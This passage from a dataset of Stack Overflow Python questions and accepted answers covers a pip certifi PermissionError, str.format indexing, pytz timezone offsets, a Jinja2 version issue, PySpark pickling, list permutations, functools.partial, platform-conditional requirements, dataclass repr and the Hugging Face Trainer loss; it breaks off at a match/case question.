\"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\main_parser.py\", line 8, in \n    from pip._internal.cli import cmdoptions\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\cmdoptions.py\", line 23, in \n    from pip._internal.cli.parser import ConfigOptionParser\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\cli\\parser.py\", line 12, in \n    from pip._internal.configuration import Configuration, ConfigurationError\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\configuration.py\", line 21, in \n    from pip._internal.exceptions import (\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_internal\\exceptions.py\", line 8, in \n    from pip._vendor.requests.models import Request, Response\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_vendor\\requests\\__init__.py\", line 123, in \n    from . import utils\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\pip\\_vendor\\requests\\utils.py\", line 25, in \n    from . import certs\n  File \"\", line 1027, in _find_and_load\n  File \"\", line 1006, in _find_and_load_unlocked\n  File \"\", line 688, in _load_unlocked\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 170, in exec_module\n    notify_module_loaded(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\decorators.py\", line 470, in _synchronized\n    return wrapped(*args, **kwargs)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 136, in notify_module_loaded\n    hook(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi_win32\\wrapt_pip.py\", line 35, in apply_patches\n    import certifi\n  File \"\", line 1027, in _find_and_load\n  File \"\", line 1006, in _find_and_load_unlocked\n  File \"\", line 688, in _load_unlocked\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 170, in exec_module\n    notify_module_loaded(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\decorators.py\", line 470, in _synchronized\n    return wrapped(*args, **kwargs)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\wrapt\\importer.py\", line 136, in notify_module_loaded\n    hook(module)\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi_win32\\wrapt_certifi.py\", line 20, in apply_patches\n    certifi_win32.wincerts.CERTIFI_PEM = certifi.where()\n  File \"C:\\Users\\visha\\PycharmProjects\\GUI_Automation\\venv\\lib\\site-packages\\certifi\\core.py\", line 37, in where\n    _CACERT_PATH = str(_CACERT_CTX.__enter__())\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\contextlib.py\", line 135, in __enter__\n    return next(self.gen)\n  File \"C:\\Users\\visha\\AppData\\Local\\Programs\\Python\\Python310\\lib\\importlib\\_common.py\", line 95, in _tempfile\n    os.remove(raw_path)\nPermissionError: [WinError 32] The process cannot access the file because it is being used by another process: 'C:\\\\Users\\\\visha\\\\AppData\\\\Local\\\\Temp\\\\tmpy_tb8siv'\nPS C:\\Users\\visha\\PycharmProjects\\master_test_runner> \n\n",
    "AcceptedAnswerId": 72087091,
    "AcceptedAnswer": "I ran into the same issue today.  I corrected it by removing two *.pth files that were created when I had installed python-certifi-win32.  This prevents python-certifi-win32 from loading when python is run.\nThe files are listed below, and were located here:\nC:\\Users\\\\AppData\\Local\\Programs\\Python\\Python310\\Lib\\site-packages\n\nFiles:\npython-certifi-win32-init.pth\ndistutils-precedence.pth\n\nRemoving these files allowed me to install/uninstall other modules.\n"
}
{
    "Id": 71787974,
    "PostTypeId": 1,
    "Title": "Why does `'{x[1:3]}'.format(x=\"asd\")` cause a TypeError?",
    "Body": "Consider this:\n>>> '{x[1]}'.format(x=\"asd\")\n's'\n>>> '{x[1:3]}'.format(x=\"asd\")\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: string indices must be integers\n\nWhat could be the cause for this behavior?\n",
    "AcceptedAnswerId": 71788626,
    "AcceptedAnswer": "An experiment based on your comment, checking what value the object's __getitem__ method actually receives:\nclass C:\n    def __getitem__(self, index):\n        print(repr(index))\n\n'{c[4]}'.format(c=C())\n'{c[4:6]}'.format(c=C())\n'{c[anything goes!@#$%^&]}'.format(c=C())\nC()[4:6]\n\nOutput (Try it online!):\n4\n'4:6'\n'anything goes!@#$%^&'\nslice(4, 6, None)\n\nSo while the 4 gets converted to an int, the 4:6 isn't converted to slice(4, 6, None) as in usual slicing. Instead, it remains simply the string '4:6'. And that's not a valid type for indexing/slicing a string, hence the TypeError: string indices must be integers you got.\nUpdate:\nIs that documented? Well... I don't see something really clear, but @GACy20 pointed out something subtle. The grammar has these rules\nfield_name        ::=  arg_name (\".\" attribute_name | \"[\" element_index \"]\")*\nelement_index     ::=  digit+ | index_string\nindex_string      ::=   +\n\nOur c[4:6] is the field_name, and we're interested in the element_index part 4:6. I think it would be clearer if digit+ had its own rule with meaningful name:\nfield_name        ::=  arg_name (\".\" attribute_name | \"[\" element_index \"]\")*\nelement_index     ::=  index_integer | index_string\nindex_integer     ::=  digit+\nindex_string      ::=   +\n\nI'd say having index_integer and index_string would more clearly indicate that digit+ is converted to an integer (instead of staying a digit string), while  + would stay a string.\nThat said, looking at the rules as they are, perhaps we should think \"what would be the point of separating the digits case out of the any-characters case which would match it as well?\" and think that the point is to treat pure digits differently, presumably to convert them to an integer. Or maybe some other part of the documentation even states that digit or digits+ in general gets converted to an integer.\n"
}
{
    "Id": 71768804,
    "PostTypeId": 1,
    "Title": "Two ways to create timezone aware datetime objects (Django). Seven minutes difference?",
    "Body": "Up to now I thought both ways to create a timezone aware datetime are equal.\nBut they are not:\nimport datetime\n\nfrom django.utils.timezone import make_aware, get_current_timezone\n\nmake_aware(datetime.datetime(1999, 1, 1, 0, 0, 0), get_current_timezone())\n\ndatetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())\n\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\nIn the Django Admin GUI second way creates this (German date format dd.mm.YYYY):\n01.01.1999 00:07:00\n\nWhy are there 7 minutes difference if I use this:\ndatetime.datetime(1999, 1, 1, 0, 0, 0, tzinfo=get_current_timezone())\n\n",
    "AcceptedAnswerId": 71823301,
    "AcceptedAnswer": "This happens on Django 3.2 and lower, which rely on the pytz library. In Django 4 (unless you enable to setting to use the deprecated library), the output of the two examples you give is identical.\nIn Django 3.2 and below, the variance arises because the localised time is built in two different ways. When using make_aware, it is done by calling the localize() method on the pytz timezone instance. In the second version, it's done by passing a tzinfo object directly to the datetime constructor.\nThe difference between the two is well illustrated in this blog post:\n\nThe biggest mistake people make with pytz is simply attaching its time zones to the constructor, since that is the standard way to add a time zone to a datetime in Python. If you try and do that, the best case scenario is that you'll get something obviously absurd:\nimport pytz\nfrom datetime import datetime\n\nNYC = pytz.timezone('America/New_York')\ndt = datetime(2018, 2, 14, 12, tzinfo=NYC)\nprint(dt)\n# 2018-02-14 12:00:00-04:56\n\nWhy is the time offset -04:56 and not -05:00? Because that was the local solar mean time in New York before standardized time zones were adopted, and is thus the first entry in the America/New_York time zone. Why did pytz return that? Because unlike the standard library's model of lazily-computed time zone information, pytz takes an eager calculation approach.\nWhenever you construct an aware datetime from a naive one, you need to call the localize function on it:\ndt = NYC.localize(datetime(2018, 2, 14, 12))\nprint(dt)\n# 2018-02-14 12:00:00-05:00\n\n\nExactly the same thing is happening with your Europe/Berlin example. pytz is eagerly fetching the first entry in its database, which is a pre-1983 solar time, which was 53 minutes and 28 seconds ahead of Greenwich Mean Time (GMT). This is obviously inappropriate given the date - but the tzinfo isn't aware of the date you are using unless you pass it to localize().\nThis is the difference between your two approaches. Using make_aware correctly calls localize() on the object. Assigning the tzinfo directly to the datetime object, however, doesn't, and results in pytz using the (wrong) time zone information because it was simply the first entry for that zone in its database.\nThe pytz documentation obliquely refers to this as well:\n\nThis library only supports two ways of building a localized time. The first is to use the localize() method provided by the pytz library. This is used to localize a naive datetime (datetime with no timezone information)... The second way of building a localized time is by converting an existing localized time using the standard astimezone() method... Unfortunately using the tzinfo argument of the standard datetime constructors \u2018\u2019does not work\u2019\u2019 with pytz for many timezones.\n\nIt is actually because of these and several other bugs in the pytz implementation that Django dropped it in favour of Python's built-in zoneinfo module.\nMore from that blog post:\n\nAt the time of its creation, pytz was cleverly designed to optimize for performance and correctness, but with the changes introduced by PEP 495 and the performance improvements to dateutil, the reasons to use it are dwindling.\n... The biggest reason to use dateutil over pytz is the fact that dateutil uses the standard interface and pytz doesn't, and as a result it is very easy to use pytz incorrectly.\n\nPassing a pytz tzinfo object directly to a datetime constructor is incorrect. You must call localize() on the tzinfo class, passing it the date. The correct way to initialise the datetime in your second example is:\n> berlin = get_current_timezone()\n> berlin.localize(datetime.datetime(1999, 1, 1, 0, 0, 0))\ndatetime.datetime(1999, 1, 1, 0, 0, tzinfo=)\n\n... which matches what make_aware produces.\n"
}
{
    "Id": 71194918,
    "PostTypeId": 1,
    "Title": "when i use docker-compose to install a fastapi project, i got AssertionError:",
    "Body": "when I use docker-compose to install a fastapi project, I got AssertionError: jinja2 must be installed to use Jinja2Templates\nbut when I use env to install it, that will be run well.\nmy OS:\nUbuntu18.04STL\nmy requirements.txt:\nfastapi~=0.68.2\nstarlette==0.14.2\npydantic~=1.8.1\n\nuvicorn~=0.12.3\nSQLAlchemy~=1.4.23\n\n# WSGI\nWerkzeug==1.0.1\n\npyjwt~=1.7.0\n\n# async-exit-stack~=1.0.1\n# async-generator~=1.10\n\njinja2~=2.11.2\n\n# assert aiofiles is not None, \"'aiofiles' must be installed to use FileResponse\"\naiofiles~=0.6.0\npython-multipart~=0.0.5\n\nrequests~=2.25.0\npyyaml~=5.3.1\n# html-builder==0.0.6\nloguru~=0.5.3\napscheduler==3.7.0\n\npytest~=6.1.2\nhtml2text==2020.1.16\nmkdocs==1.2.1\n\n\nDockerfile\nFROM python:3.8\nENV PYTHONDONTWRITEBYTECODE 1\nENV PYTHONUNBUFFERED 1\n\nWORKDIR /server\nCOPY requirements.txt /server/\nRUN pip install -r requirements.txt\nCOPY . /server/\n\ndocker-compose.yml\nversion: '3.7'\n\nservices:\n  figbox_api:\n    build:\n        context: .\n        dockerfile: Dockerfile\n    command:  uvicorn app.main:app --port 8773 --host 0.0.0.0 --reload\n    volumes:\n    - .:/server\n    ports:\n    - 8773:8773\n\nDo I need to provide some other information?\nThanks\n",
    "AcceptedAnswerId": 72120645,
    "AcceptedAnswer": "I had a same problem on heroku, the error comes from Jinja2\nversion 2.11.x and it run locally but not in Heroku.\nJust install latest version of jinja2 it will work fine in your case too.\npip install Jinja2==3.1.2\nor \npip install Jinja2 --upgrade\n\n"
}
{
    "Id": 72106357,
    "PostTypeId": 1,
    "Title": "access objects in pyspark user-defined function from outer scope, avoid PicklingError: Could not serialize object",
    "Body": "How do I avoid initializing a class within a pyspark user-defined function?  Here is an example.\nCreating a spark session and DataFrame representing four latitudes and longitudes.\nimport pandas as pd\nfrom pyspark import SparkConf\nfrom pyspark.sql import SparkSession\n\nconf = SparkConf()\nconf.set('spark.sql.execution.arrow.pyspark.enabled', 'true')\nspark = SparkSession.builder.config(conf=conf).getOrCreate()\n\nsdf = spark.createDataFrame(pd.DataFrame({\n    'lat': [37, 42, 35, -22],\n    'lng': [-113, -107, 127, 34]}))\n\nHere is the Spark DataFrame\n+---+----+\n|lat| lng|\n+---+----+\n| 37|-113|\n| 42|-107|\n| 35| 127|\n|-22|  34|\n+---+----+\n\nEnriching the DataFrame with a timezone string at each latitude / longitude via the timezonefinder package.  Code below runs without errors\nfrom typing import Iterator\nfrom timezonefinder import TimezoneFinder\n\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    for dx in iterator:\n        tzf = TimezoneFinder()\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\npdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()\n\nThe above code runs without errors and creates the pandas DataFrame below.  The issue is the TimezoneFinder class is initialized within the user-defined function which creates a bottleneck\nIn [4]: pdf\nOut[4]:\n    lat    lng         timezone\n0  37.0 -113.0  America/Phoenix\n1  42.0 -107.0   America/Denver\n2  35.0  127.0       Asia/Seoul\n3 -22.0   34.0    Africa/Maputo\n\nThe question is how to get this code to run more like below, where the TimezoneFinder class is initialized once and outside of the user-defined function.  As is, the code below generates this error PicklingError: Could not serialize object: TypeError: cannot pickle '_io.BufferedReader' object\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    for dx in iterator:\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\ntzf = TimezoneFinder()\npdf = sdf.mapInPandas(func, schema='lat double, lng double, timezone string').toPandas()\n\nUPDATE - Also tried to use functools.partial and an outer function but still received same error.  That is, this approach does not work:\ndef outer(iterator, tzf):\n    def func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n        for dx in iterator:\n            dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n            yield dx\n    return func(iterator)\ntzf = TimezoneFinder()\nouter = partial(outer, tzf=tzf)\npdf = sdf.mapInPandas(outer, schema='lat double, lng double, timezone string').toPandas()\n\n",
    "AcceptedAnswerId": 72143511,
    "AcceptedAnswer": "You will need a cached instance of the object on every worker.\nYou could do that as follows\ninstance = [None]\n\ndef func(iterator: Iterator[pd.DataFrame]) -> Iterator[pd.DataFrame]:\n    if instance[0] is None:\n        instance[0] = TimezoneFinder()\n    tzf = instance[0]\n    for dx in iterator:\n        dx['timezone'] = [tzf.timezone_at(lng=a, lat=b) for a, b in zip(dx['lng'], dx['lat'])]\n        yield dx\n\nNote that for this to work, your function would be defined within a module, to give the instance cache somewhere to live. Else you would have to hang it off some builtin module, e.g., os.instance = [].\n"
}
{
    "Id": 71564200,
    "PostTypeId": 1,
    "Title": "Python how to revert the pattern of a list rearrangement",
    "Body": "So I am rearranging a list based on an index pattern and would like to find a way to calculate the pattern I need to revert the list back to its original order.\nfor my example I am using a list of 5 items as I can work out the pattern needed to revert the list back to its original state.\nHowever this isn't so easy when dealing with 100's of list items.\ndef rearrange(pattern: list, L: list):\n    new_list = []\n    for i in pattern:\n        new_list.append(L[i-1])\n    return new_list\n\nprint(rearrange([2,5,1,3,4], ['q','t','g','x','r']))\n\n#['t', 'r', 'q', 'g', 'x']\n\nand in order to set it back to the original pattern\nI would use\nprint(rearrange([3,1,4,5,2],['t', 'r', 'q', 'g', 'x']))\n#['q', 't', 'g', 'x', 'r']\n\nWhat I am looking for is a way to calculate the pattern \"[3,1,4,5,2]\"\nregarding the above example.\nwhist running the script so that I can set the list back to its original order.\nUsing a larger example:\nprint(rearrange([18,20,10,11,13,1,9,12,16,6,15,5,3,7,17,2,19,8,14,4],['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']))\n#['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']\n\nbut I need to know the pattern to use with this new list in order to return it to its original state.\nprint(rearrange([???],['n', 'o', 'f', 'c', 'd', 'e', 'm', 'g', 't', 'r', 'l', 's', 'b', 'q', 'a', 'p', 'j', 'h', 'k', 'i']))\n#['e','p','b','i','s','r','q','h','m','f','c','g','d','k','l','t','a','n','j','o']\n\n",
    "AcceptedAnswerId": 71564272,
    "AcceptedAnswer": "This is commonly called \"argsort\". But since you're using 1-based indexing, you're off-by-one. You can get it with numpy:\n>>> pattern\n[2, 5, 1, 3, 4]\n>>> import numpy as np\n>>> np.argsort(pattern) + 1\narray([3, 1, 4, 5, 2])\n\nWithout numpy:\n>>> [1 + i for i in sorted(range(len(pattern)), key=pattern.__getitem__)]\n[3, 1, 4, 5, 2]\n\n"
}
{
    "Id": 71402387,
    "PostTypeId": 1,
    "Title": "The rationale of `functools.partial` behavior",
    "Body": "I'm wondering what the story -- whether sound design or inherited legacy -- is behind these functools.partial and inspect.signature facts (talking python 3.8 here).\nSet up:\nfrom functools import partial\nfrom inspect import signature\n\ndef bar(a, b):\n    return a / b\n\nAll starts well with the following, which seems compliant with curry-standards.\nWe're fixing a to 3 positionally, a disappears from the signature and it's value is indeed bound to 3:\nf = partial(bar, 3)\nassert str(signature(f)) == '(b)'\nassert f(6) == 0.5 == f(b=6)\n\nIf we try to specify an alternate value for a, f won't tell us that we got an unexpected keyword, but rather that it got multiple values for argument a:\nf(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'\nf(c=2, b=6)  # TypeError: bar() got an unexpected keyword argument 'c'\n\nBut now if we fix b=3 through a keyword, b is not removed from the signature, it's kind changes to keyword-only, and we can still use it (overwrite the default, as a normal default, which we couldn't do with a in the previous case):\nf = partial(bar, b=3)\nassert str(signature(f)) == '(a, *, b=3)'\nassert f(6) == 2.0 == f(6, b=3)\nassert f(6, b=1) == 6.0\n\nWhy such asymmetry?\nIt gets even stranger, we can do this:\nf = partial(bar, a=3)\nassert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?\n\nFine: For keyword-only arguments, there can be no confusing of what parameter a default is assigned to, but I still wonder what design-thinking or constraints are behind these choices.\n",
    "AcceptedAnswerId": 71403608,
    "AcceptedAnswer": "Using partial with a Positional Argument\nf = partial(bar, 3)\n\nBy design, upon calling a function, positional arguments are assigned first. Then logically, 3 should be assigned to a with partial. It makes sense to remove it from the signature as there is no way to assign anything to it again!\nwhen you have f(a=2, b=6), you are actually doing\nbar(3, a=2, b=6)\n\nwhen you have f(2, 2), you are actually doing\nbar (3, 2, 2)\n\nWe never get rid of 3\nFor the new partial function:\n\nWe can't give a a different value with another positional argument\nWe can't use the keyword a to assign a different value to it as it is already \"filled\"\n\n\nIf there is a parameter with the same name as the keyword, then the argument value is assigned to that parameter slot. However, if the parameter slot is already filled, then that is an error.\n\nI recommend reading the function calling behavior section of pep-3102 to get a better grasp of this matter.\nUsing partial with a Keyword Argument\nf = partial(bar, b=3)\n\nThis is a different use case. We are applying a keyword argument to bar.\nYou are functionally turning\ndef bar(a, b):\n    ...\n\ninto\ndef f(a, *, b=3):\n    ...\n\nwhere b becomes a keyword-only argument\ninstead of\ndef f(a, b=3):\n    ...\n\ninspect.signature correctly reflects a design decision of partial. The keyword arguments passed to partial are designed to append additional positional arguments (source).\nNote that this behavior does not necessarily override the keyword arguments supplied with f = partial(bar, b=3), i.e., b=3 will be applied regardless of whether you supply the second positional argument or not (and there will be a TypeError if you do so). This is different from a positional argument with a default value.\n>>> f(1, 2)\nTraceback (most recent call last):\n  File \"\", line 1, in \nTypeError: f() takes 1 positional argument but 2 were given\n\nwhere f(1, 2) is equivalent to bar(1, 2, b=3)\nThe only way to override it is with a keyword argument\n>>> f(2, b=2)\n\nAn argument that can only be assigned with a keyword but positionally? This is a keyword-only argument. Thus (a, *, b=3) instead of (a, b=3).\nThe Rationale of Non-default Argument follows Default Argument\nf = partial(bar, a=3)\nassert str(signature(f)) == '(*, a=3, b)'  # whaaa?! non-default argument follows default argument?\n\n\nYou can't do def bar(a=3, b). a and b are so called positional-or-keyword arguments.\nYou can do def bar(*, a=3, b). a and b are keyword-only arguments.\n\nEven though semantically, a has a default value and thus it is optional, we can't leave it unassigned because b, which is a positional-or-keyword argument needs to be assigned a value if we want to use b positionally. If we do not supply a value for a, we have to use b as a keyword argument.\nCheckmate! There is no way for b to be a positional-or-keyword argument as we intended.\nThe PEP for positonal-only arguments also kind of shows the rationale behind it.\nThis also has something to do with the aforementioned \"function calling behavior\".\npartial != Currying & Implementation Details\npartial by its implementation wraps the original function while storing the fixed arguments you passed to it.\nIT IS NOT IMPLEMENTED WITH CURRYING. It is rather partial application instead of currying in the sense of functional programming. partial is essentially applying the fixed arguments first, then the arguments you called with the wrapper:\ndef __call__(self, /, *args, **keywords):\n    keywords = {**self.keywords, **keywords}\n    return self.func(*self.args, *args, **keywords)\n\nThis explains f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a'.\nSee also: Why is partial called partial instead of curry\nUnder the Hood of inspect\nThe outputs of inspect is another story.\ninspect itself is a tool that produces user-friendly outputs. For partial() in particular (and partialmethod(), similarly), it follows the wrapped function while taking the fixed parameters into account:\nif isinstance(obj, functools.partial):\n    wrapped_sig = _get_signature_of(obj.func)\n    return _signature_get_partial(wrapped_sig, obj)\n\nDo note that it is not inspect.signature's goal to show you the actual signature of the wrapped function in the AST.\ndef _signature_get_partial(wrapped_sig, partial, extra_args=()):\n    \"\"\"Private helper to calculate how 'wrapped_sig' signature will\n    look like after applying a 'functools.partial' object (or alike)\n    on it.\n    \"\"\"\n    ...\n\nSo we have a nice and ideal signature for f = partial(bar, 3)\nbut get f(a=2, b=6)  # TypeError: bar() got multiple values for argument 'a' in reality.\nFollow-up\nIf you want currying so badly, how do you implement it in Python, in the way which gives you the expected TypeError?\n"
}
{
    "Id": 71688065,
    "PostTypeId": 1,
    "Title": "Generic requirements.txt for TensorFlow on both Apple M1 and other devices",
    "Body": "I have a new MacBook with the Apple M1 chipset. To install tensorflow, I follow the instructions here, i.e., installing tensorflow-metal and tensorflow-macos instead of the normal tensorflow package.\nWhile this works fine, it means that I can't run the typical pip install -r requirements.txt as long as we have tensorflow in the requirements.txt. If we instead include tensorflow-macos, it'll lead to problems for non-M1 or even non-macOS users.\nOur library must work on all platforms. Is there a generic install command that installs the correct TensorFlow version depending on whether the computer is a M1 Mac or not? So that we can use a single requirements.txt for everyone?\nOr if that's not possible, can we pass some flag/option, e.g., pip install -r requirements.txt --m1 to install some variation?\nWhat's the simplest and most elegant solution here?\n",
    "AcceptedAnswerId": 71866908,
    "AcceptedAnswer": "According to this post Is there a way to have a conditional requirements.txt file for my Python application based on platform?\nYou can use conditionals on your requirements.txt, thus\ntensorflow==2.8.0; sys_platform != 'darwin' or platform_machine != 'arm64'\ntensorflow-macos==2.8.0; sys_platform == 'darwin' and platform_machine == 'arm64'\n\n"
}
{
    "Id": 72161257,
    "PostTypeId": 1,
    "Title": "Exclude default fields from python `dataclass` `__repr__`",
    "Body": "Summary\nI have a dataclass with 10+ fields. print()ing them buries interesting context in a wall of defaults - let's make them friendlier by not needlessly repeating those.\nDataclasses in Python\nPython's @dataclasses.dataclass() (PEP 557) provides automatic printable representations (__repr__()).\nAssume this example, based on python.org's:\nfrom dataclasses import dataclass\n\n\n@dataclass\nclass InventoryItem:\n    name: str\n    unit_price: float = 1.00\n    quantity_on_hand: int = 0\n\nThe decorator, through @dataclass(repr=True) (default) will print() a nice output:\nInventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)\n\nWhat I want: Skip printing the defaults\nrepr It prints all the fields, including implied defaults you wouldn't want to show.\nprint(InventoryItem(\"Apple\"))\n\n# Outputs: InventoryItem(name='Apple', unit_price='1.00', quantity_on_hand=0)\n# I want: InventoryItem(name='Apple')\n\nprint(InventoryItem(\"Apple\", unit_price=\"1.05\"))\n\n# Outputs: InventoryItem(name='Apple', unit_price='1.05', quantity_on_hand=0)\n# I want: InventoryItem(name='Apple', unit_price='1.05')\n\nprint(InventoryItem(\"Apple\", quantity_on_hand=3))\n\n# Outputs: InventoryItem(name='Apple', unit_price=1.00, quantity_on_hand=3)\n# I want: InventoryItem(name='Apple', quantity_on_hand=3)\n\nprint(InventoryItem(\"Apple\", unit_price='2.10', quantity_on_hand=3))\n\n# Output is fine (everything's custom):\n# InventoryItem(name='Apple', unit_price=2.10, quantity_on_hand=3)\n\nDiscussion\nInternally, here's the machinery of dataclass repr-generator as of python 3.10.4: cls.__repr__=_repr_fn(flds, globals)) -> _recursive_repr(fn)\nIt may be the case that @dataclass(repr=False) be switched off and def __repr__(self): be added.\nIf so, what would that look like? We don't want to include the optional defaults.\nContext\nTo repeat, in practice, my dataclass has 10+ fields.\nI'm print()ing instances via running the code and repl, and @pytest.mark.parametrize when running pytest with -vvv.\nBig dataclass' non-defaults (sometimes the inputs) are impossible to see as they're buried in the default fields and worse, each one is disproportionately and distractingly huge: obscuring other valuable stuff bring printed.\nRelated questions\nAs of today there aren't many dataclass questions yet (this may change):\n\nExtend dataclass' __repr__ programmatically: This is trying to limit the repr. It should show less fields unless they're explicitly overridden.\nPython dataclass generate hash and exclude unsafe fields: This is for hashing and not related to defaults.\n\n",
    "AcceptedAnswerId": 72161437,
    "AcceptedAnswer": "You could do it like this:\nimport dataclasses\nfrom dataclasses import dataclass\nfrom operator import attrgetter\n\n\n@dataclass(repr=False)\nclass InventoryItem:\n    name: str\n    unit_price: float = 1.00\n    quantity_on_hand: int = 0\n\n    def __repr__(self):\n        nodef_f_vals = (\n            (f.name, attrgetter(f.name)(self))\n            for f in dataclasses.fields(self)\n            if attrgetter(f.name)(self) != f.default\n        )\n\n        nodef_f_repr = \", \".join(f\"{name}={value}\" for name, value in nodef_f_vals)\n        return f\"{self.__class__.__name__}({nodef_f_repr})\"\n        \n\n# Prints: InventoryItem(name=Apple)\nprint(InventoryItem(\"Apple\"))\n\n# Prints: InventoryItem(name=Apple,unit_price=1.05)\nprint(InventoryItem(\"Apple\", unit_price=\"1.05\"))\n\n# Prints: InventoryItem(name=Apple,unit_price=2.10,quantity_on_hand=3)\nprint(InventoryItem(\"Apple\", unit_price='2.10', quantity_on_hand=3))\n\n"
}
{
    "Id": 71581197,
    "PostTypeId": 1,
    "Title": "What is the loss function used in Trainer from the Transformers library of Hugging Face?",
    "Body": "What is the loss function used in Trainer from the Transformers library of Hugging Face?\nI am trying to fine tine a BERT model using the Trainer class from the Transformers library of Hugging Face.\nIn their documentation, they mention that one can specify a customized loss function by overriding the compute_loss method in the class. However, if I do not do the method override and use the Trainer to fine tine a BERT model directly for sentiment classification, what is the default loss function being use? Is it the categorical crossentropy? Thanks!\n",
    "AcceptedAnswerId": 71585375,
    "AcceptedAnswer": "It depends!\nEspecially given your relatively vague setup description, it is not clear what loss will be used. But to start from the beginning, let's first check how the default compute_loss() function in the Trainer class looks like.\nYou can find the corresponding function here, if you want to have a look for yourself (current version at time of writing is 4.17).\nThe actual loss that will be returned with default parameters is taken from the model's output values:\n\n         loss = outputs[\"loss\"] if isinstance(outputs, dict) else outputs[0]\n\nwhich means that the model itself is (by default) responsible for computing some sort of loss and returning it in outputs.\nFollowing this, we can then look into the actual model definitions for BERT (source: here, and in particular check out the model that will be used in your Sentiment Analysis task (I assume a BertForSequenceClassification model.\nThe code relevant for defining a loss function looks like this:\nif labels is not None:\n    if self.config.problem_type is None:\n        if self.num_labels == 1:\n            self.config.problem_type = \"regression\"\n        elif self.num_labels > 1 and (labels.dtype == torch.long or labels.dtype == torch.int):\n            self.config.problem_type = \"single_label_classification\"\n        else:\n            self.config.problem_type = \"multi_label_classification\"\n\n    if self.config.problem_type == \"regression\":\n        loss_fct = MSELoss()\n        if self.num_labels == 1:\n            loss = loss_fct(logits.squeeze(), labels.squeeze())\n        else:\n            loss = loss_fct(logits, labels)\n    elif self.config.problem_type == \"single_label_classification\":\n        loss_fct = CrossEntropyLoss()\n        loss = loss_fct(logits.view(-1, self.num_labels), labels.view(-1))\n    elif self.config.problem_type == \"multi_label_classification\":\n        loss_fct = BCEWithLogitsLoss()\n        loss = loss_fct(logits, labels)\n\n\nBased on this information, you should be able to either set the correct loss function yourself (by changing model.config.problem_type accordingly), or otherwise at least be able to determine whichever loss will be chosen, based on the hyperparameters of your task (number of labels, label scores, etc.)\n"
}
{
    "Id": 71441761,
    "PostTypeId": 1,
    "Title": "How to use match case with a class type",
    "Body": "I want to use match to determine an action to perform based on a class type. I cannot seem to figure out how to do it. I know their are other ways of achieving this, I would just like to know can it be done this way. I am not looking for workarounds of which there are many.\n\nclass aaa():\n    pass\n\nclass bbb():\n    pass\n\ndef f1(typ):\n    if typ is aaa:\n        print(\"aaa\")\n    elif typ is bbb:\n        print(\"bbb\")\n    else:\n        print(\"???\")\n\ndef f2(typ):\n    match typ:\n        case aaa():\n            print(\"aaa\")\n        case bbb():\n            print(\"bbb\")\n        case _:\n            print(\"???\")\n\nf1(aaa)\nf1(bbb)\nf2(aaa)\nf2(bbb)\n\nThe output is as follows:\naaa\nbbb\n???\n???\n\n",
    "AcceptedAnswerId": 71442112,
